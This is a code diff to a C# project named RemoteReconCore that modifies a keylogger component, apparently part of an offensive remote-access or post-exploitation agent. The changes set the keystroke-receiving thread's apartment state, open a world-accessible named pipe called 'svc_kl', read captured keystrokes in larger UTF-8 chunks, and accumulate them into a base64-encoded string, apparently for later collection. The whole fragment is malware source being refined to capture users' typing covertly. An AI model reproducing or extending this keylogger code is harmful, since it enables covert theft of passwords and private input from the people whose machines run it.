@@ -37,6 +37,7 @@ namespace RemoteReconCore
                     {
                         ReceiveKeyStrokes();
                     });
+                    Agent.t.SetApartmentState(ApartmentState.STA);
                     Agent.t.IsBackground = true;
                     Agent.t.Start();
 #if DEBUG
@@ -63,7 +64,7 @@ namespace RemoteReconCore
             {
                 PipeSecurity ps = new PipeSecurity();
                 ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
-                server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.WriteThrough, 128, 128, ps, HandleInheritability.None, PipeAccessRights.ChangePermissions);
+                server = new NamedPipeServerStream("svc_kl", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.WriteThrough, 128, 128, ps, HandleInheritability.None, PipeAccessRights.ChangePermissions);
 #if DEBUG
                 Console.WriteLine("Waiting for client to connect");
 #endif
@@ -92,14 +93,15 @@ namespace RemoteReconCore
                 try
                 {
                     
-                    byte[] pipeBytes = new byte[2];
-                    server.Read(pipeBytes, 0, 2);
+                    byte[] pipeBytes = new byte[5];
+                    server.Read(pipeBytes, 0, 5);
                     //server.Flush();
-                    string ks = Encoding.ASCII.GetString(pipeBytes);
-#if DEBUG
-                    Console.WriteLine("Reading Value");
-#endif
+                    string ks = Encoding.UTF8.GetString(pipeBytes);
+
                     ks = ks.TrimEnd(new char[] { '\0'});
+#if DEBUG
+                    Console.Write(ks);
+#endif
                     oldVal = oldVal + ks;
                     enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(oldVal));
                 }
